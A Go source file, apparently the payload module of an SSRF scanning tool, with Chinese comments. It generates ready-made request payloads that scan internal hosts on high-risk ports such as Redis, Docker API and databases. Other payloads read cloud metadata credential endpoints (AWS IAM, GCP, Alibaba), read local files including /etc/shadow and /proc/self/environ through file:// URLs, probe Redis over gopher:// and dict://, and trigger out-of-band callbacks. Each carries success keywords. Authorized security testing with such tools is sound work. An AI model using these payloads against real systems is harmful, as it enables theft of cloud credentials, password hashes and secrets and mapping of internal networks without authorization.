package payloads

import (
	"fmt"
)

// Payload payload结构
type Payload struct {
	Value       string
	Type        string
	Description string
	Severity    string
	Keywords    []string
}

// GetPortScanPayloads 获取端口扫描payload（优先高危端口）
// internalIPs: 要扫描的内网IP列表，如果为空则只扫描127.0.0.1
func GetPortScanPayloads(internalIPs []string) []Payload {
	var payloads []Payload

	// 高危端口列表（优先探测）
	highRiskPorts := []struct {
		Port    int
		Service string
		Risk    string
	}{
		{6379, "Redis", "未授权访问可导致数据泄露/命令执行"},
		{3306, "MySQL", "数据库未授权访问"},
		{5432, "PostgreSQL", "数据库未授权访问"},
		{27017, "MongoDB", "NoSQL数据库未授权访问"},
		{9200, "Elasticsearch", "未授权访问可导致数据泄露"},
		{11211, "Memcached", "缓存未授权访问"},
		{5984, "CouchDB", "数据库未授权访问"},
		{2375, "Docker API", "Docker未授权访问可导致容器逃逸"},
		{8086, "InfluxDB", "时序数据库未授权访问"},
		{9000, "FastCGI", "FastCGI未授权访问"},
		{5000, "Docker Registry", "Docker仓库未授权访问"},
		{8080, "Web服务", "常见Web服务端口"},
		{8888, "Web服务", "常见Web服务端口"},
		{80, "HTTP", "HTTP服务"},
		{443, "HTTPS", "HTTPS服务"},
		{22, "SSH", "SSH服务"},
		{21, "FTP", "FTP服务"},
		{3389, "RDP", "远程桌面"},
		{445, "SMB", "SMB文件共享"},
	}

	// 决定要扫描的IP列表
	var targetIPs []string
	if len(internalIPs) > 0 {
		// 如果指定了内网IP，使用指定的IP列表
		targetIPs = internalIPs
	} else {
		// 默认只扫描本地
		targetIPs = []string{
			"127.0.0.1",
			"localhost",
			"0.0.0.0",
		}
	}

	// 生成HTTP协议的端口扫描payload
	for _, ip := range targetIPs {
		for _, port := range highRiskPorts {
			payload := Payload{
				Value:       fmt.Sprintf("http://%s:%d", ip, port.Port),
				Type:        "端口扫描",
				Description: fmt.Sprintf("%s:%d (%s) - %s", ip, port.Port, port.Service, port.Risk),
				Severity:    determineSeverity(port.Port),
				Keywords:    getServiceKeywords(port.Service),
			}
			payloads = append(payloads, payload)
		}
	}

	// 添加云服务元数据接口
	cloudMetadata := []Payload{
		{
			Value:       "http://169.254.169.254/latest/meta-data/",
			Type:        "云元数据",
			Description: "AWS元数据接口 - 可能泄露云服务器凭证",
			Severity:    "high",
			Keywords:    []string{"ami-id", "instance-id", "security-credentials"},
		},
		{
			Value:       "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			Type:        "云元数据",
			Description: "AWS IAM凭证 - 可能泄露AccessKey",
			Severity:    "high",
			Keywords:    []string{"AccessKeyId", "SecretAccessKey", "Token"},
		},
		{
			Value:       "http://metadata.google.internal/computeMetadata/v1/",
			Type:        "云元数据",
			Description: "Google Cloud元数据接口",
			Severity:    "high",
			Keywords:    []string{"instance", "project", "service-accounts"},
		},
		{
			Value:       "http://100.100.100.200/latest/meta-data/",
			Type:        "云元数据",
			Description: "阿里云元数据接口",
			Severity:    "high",
			Keywords:    []string{"instance-id", "region-id"},
		},
	}
	payloads = append(payloads, cloudMetadata...)

	return payloads
}

// GetFileReadPayloads 获取文件读取payload
func GetFileReadPayloads() []Payload {
	return []Payload{
		// Linux系统文件
		{
			Value:       "file:///etc/passwd",
			Type:        "文件读取",
			Description: "读取Linux系统用户文件",
			Severity:    "high",
			Keywords:    []string{"root:", "bin:", "daemon:", "nobody:"},
		},
		{
			Value:       "file:///etc/shadow",
			Type:        "文件读取",
			Description: "读取Linux密码哈希文件",
			Severity:    "high",
			Keywords:    []string{"root:", "$6$", "$5$"},
		},
		{
			Value:       "file:///etc/hosts",
			Type:        "文件读取",
			Description: "读取hosts文件",
			Severity:    "medium",
			Keywords:    []string{"localhost", "127.0.0.1"},
		},
		{
			Value:       "file:///proc/self/environ",
			Type:        "文件读取",
			Description: "读取进程环境变量",
			Severity:    "high",
			Keywords:    []string{"PATH=", "HOME=", "USER="},
		},
		{
			Value:       "file:///proc/self/cmdline",
			Type:        "文件读取",
			Description: "读取进程命令行",
			Severity:    "medium",
			Keywords:    []string{"python", "java", "node"},
		},

		// Windows系统文件
		{
			Value:       "file:///c:/windows/win.ini",
			Type:        "文件读取",
			Description: "读取Windows配置文件",
			Severity:    "medium",
			Keywords:    []string{"[fonts]", "[extensions]", "for 16-bit app support"},
		},
		{
			Value:       "file:///c:/windows/system32/drivers/etc/hosts",
			Type:        "文件读取",
			Description: "读取Windows hosts文件",
			Severity:    "medium",
			Keywords:    []string{"localhost", "127.0.0.1"},
		},

		// 其他协议
		{
			Value:       "dict://127.0.0.1:6379/info",
			Type:        "协议探测",
			Description: "Dict协议探测Redis",
			Severity:    "high",
			Keywords:    []string{"redis_version", "tcp_port", "role:"},
		},
		{
			Value:       "gopher://127.0.0.1:6379/_INFO",
			Type:        "协议探测",
			Description: "Gopher协议探测Redis",
			Severity:    "high",
			Keywords:    []string{"redis_version", "tcp_port"},
		},
	}
}

// GetOOBPayloads 获取OOB测试payload
func GetOOBPayloads(oobServer string) []Payload {
	if oobServer == "" {
		return []Payload{}
	}

	// 生成唯一标识
	return []Payload{
		{
			Value:       fmt.Sprintf("%s/callback?id=http-test", oobServer),
			Type:        "OOB检测",
			Description: "HTTP回连测试",
			Severity:    "high",
			Keywords:    []string{},
		},
		{
			Value:       fmt.Sprintf("%s/callback?id=https-test", oobServer),
			Type:        "OOB检测",
			Description: "HTTPS回连测试",
			Severity:    "high",
			Keywords:    []string{},
		},
	}
}

// GetCustomPayloads 从文件加载自定义payload
func GetCustomPayloads(filepath string) ([]Payload, error) {
	// TODO: 实现从文件加载
	return []Payload{}, nil
}

// determineSeverity 根据端口确定危险等级
func determineSeverity(port int) string {
	highRiskPorts := map[int]bool{
		6379:  true, // Redis
		3306:  true, // MySQL
		5432:  true, // PostgreSQL
		27017: true, // MongoDB
		9200:  true, // Elasticsearch
		11211: true, // Memcached
		2375:  true, // Docker API
		5000:  true, // Docker Registry
	}

	if highRiskPorts[port] {
		return "high"
	}
	return "medium"
}

// getServiceKeywords 获取服务特征关键字
func getServiceKeywords(service string) []string {
	keywords := map[string][]string{
		"Redis":         {"redis_version", "PONG", "role:master"},
		"MySQL":         {"mysql", "MariaDB", "Access denied"},
		"PostgreSQL":    {"PostgreSQL", "FATAL", "password authentication"},
		"MongoDB":       {"MongoDB", "unauthorized", "errmsg"},
		"Elasticsearch": {"cluster_name", "version", "tagline"},
		"Memcached":     {"STAT", "version", "curr_connections"},
		"HTTP":          {"HTTP/", "Server:", "Content-Type"},
		"Docker API":    {"Containers", "Images", "API version"},
	}

	if kw, ok := keywords[service]; ok {
		return kw
	}
	return []string{}
}
